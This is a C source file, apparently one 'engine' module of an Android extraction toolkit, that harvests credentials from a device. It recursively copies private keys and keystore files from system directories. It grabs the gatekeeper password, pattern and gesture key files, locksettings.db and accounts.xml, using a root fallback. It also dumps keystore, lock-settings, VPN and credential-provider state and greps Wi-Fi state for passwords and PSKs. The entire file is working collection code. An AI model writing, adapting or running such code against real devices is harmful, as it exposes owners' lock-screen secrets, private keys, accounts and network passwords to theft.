// engine_19_keystore.c - Android Keystore & credential extraction
#include "common.h"
static int write_file_with_name(const char *dir, const char *name, const char *content) {
    char p[MAX_PATH]; snprintf(p, sizeof(p), "%s/%s", dir, name); return write_file(p, content);
}
static int dump_cmd(const char *res, const char *name, const char *cmd, char *buf, size_t bufsz) {
    if (run_cmd(cmd, buf, bufsz) < 0 || strlen(buf) < 5) return 0;
    write_file_with_name(res, name, buf); return 1;
}
static int scan_for_keys(const char *base, const char *out, int depth) {
    DIR *d = opendir(base); if (!d || depth > 6) return 0;
    struct dirent *e; char sp[MAX_PATH]; int n = 0;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.') continue;
        snprintf(sp, sizeof(sp), "%s/%s", base, e->d_name);
        struct stat st; if (stat(sp, &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) {
            n += scan_for_keys(sp, out, depth + 1);
        } else if (S_ISREG(st.st_mode) && st.st_size > 0 && st.st_size < 10485760) {
            int is_key = has_ext(e->d_name, ".pk8") || has_ext(e->d_name, ".pem") ||
                        has_ext(e->d_name, ".key") || has_ext(e->d_name, ".keystore") ||
                        has_ext(e->d_name, ".bks") || has_ext(e->d_name, ".jks") ||
                        has_ext(e->d_name, ".p12") || has_ext(e->d_name, ".pfx") ||
                        has_ext(e->d_name, ".cer") || has_ext(e->d_name, ".crt") ||
                        has_ext(e->d_name, ".der") || has_ext(e->d_name, ".p7b") ||
                        strstr(e->d_name, "keystore") || strstr(e->d_name, "Keystore") ||
                        strstr(e->d_name, "KEYSTORE");
            if (is_key) {
                char dst[MAX_PATH * 2];
                snprintf(dst, sizeof(dst), "%s/%s", out, sp);
                char *clean = dst; while (*clean) { if (*clean == '/') *clean = '_'; clean++; }
                snprintf(dst, MAX_PATH * 2, "%s/key_%s", out, dst);
                if (strlen(dst) < 240 && copy_file(sp, dst) == 0 && file_size(dst) > 0) n++;
            }
        }
    } closedir(d); return n;
}
int main(int argc, char **argv) {
    const char *outdir = argc > 1 ? argv[1] : ".";
    char res[MAX_PATH], jsonname[MAX_PATH], buf[65536], cmd[MAX_PATH * 2];
    snprintf(res, sizeof(res), "%s/keystore", outdir); mkdir_p(res);
    snprintf(jsonname, sizeof(jsonname), "%s/.engine_19.json", outdir); json_start(jsonname);
    int count = 0;
    // Keystore files
    const char *ks_paths[] = {
        "/data/misc/keystore/",
        "/data/misc/keystore/persist/",
        "/data/system/sync/accounts.xml",
        "/data/system/registered_services/",
        "/data/misc/vpn/",
        "/data/misc/trusted_credentials/",
        "/data/misc/credstore/",
        "/data/system/device_policies.xml",
        "/data/system/appops.xml",
        NULL
    };
    for (int i = 0; ks_paths[i]; i++) {
        if (dir_exists(ks_paths[i])) {
            count += scan_for_keys(ks_paths[i], res, 0);
        } else {
            char dst[MAX_PATH]; const char *l = strrchr(ks_paths[i], '/');
            snprintf(dst, sizeof(dst), "%s/%s", res, l ? l + 1 : "ks_file");
            save_with_root_fallback(ks_paths[i], dst);
            if (file_exists(dst) && file_size(dst) > 0) count++;
        }
    }
    // dumpsys keystore
    count += dump_cmd(res, "dumpsys_keystore.txt", "dumpsys android.security.keystore 2>/dev/null | head -2000 || true", buf, sizeof(buf));
    count += dump_cmd(res, "dumpsys_lock_settings.txt", "dumpsys lock_settings 2>/dev/null | head -500 || true", buf, sizeof(buf));
    count += dump_cmd(res, "dumpsys_trust.txt", "dumpsys trust 2>/dev/null | head -500 || true", buf, sizeof(buf));
    count += dump_cmd(res, "dumpsys_credential.txt", "dumpsys credential 2>/dev/null | head -500 || true", buf, sizeof(buf));
    // cmd credential
    count += dump_cmd(res, "cmd_credential.txt", "cmd credential list-providers 2>/dev/null || true", buf, sizeof(buf));
    // VPN configs
    count += dump_cmd(res, "vpn_configs.txt", "cmd vpn list 2>/dev/null || dumpsys connectivity 2>/dev/null | grep -A20 VPN || true", buf, sizeof(buf));
    // WiFi credentials (stored in keystore)
    count += dump_cmd(res, "wifi_keystore.txt", "dumpsys wifi 2>/dev/null | grep -iE '(keystore|password|psk|credential)' | head -200 || true", buf, sizeof(buf));
    // Gatekeeper
    const char *gk_paths[] = {
        "/data/system/gatekeeper.password.key",
        "/data/system/gatekeeper.pattern.key",
        "/data/system/gatekeeper.gesture.key",
        "/data/system/locksettings.db",
        "/data/system/locksettings.db-wal",
        "/data/system/locksettings.db-shm",
        NULL
    };
    for (int i = 0; gk_paths[i]; i++) {
        char dst[MAX_PATH]; const char *l = strrchr(gk_paths[i], '/');
        snprintf(dst, sizeof(dst), "%s/%s", res, l ? l + 1 : "gk");
        save_with_root_fallback(gk_paths[i], dst);
        if (file_exists(dst) && file_size(dst) > 5) count++;
    }
    // Search for credential files broadly
    count += scan_for_keys("/data/system/", res, 0);
    count += scan_for_keys("/data/misc/", res, 0);
    json_ki("files_extracted", count); json_end();
    printf("{\"engine\":\"keystore\",\"status\":\"ok\",\"files\":%d}\n", count);
    return 0;
}
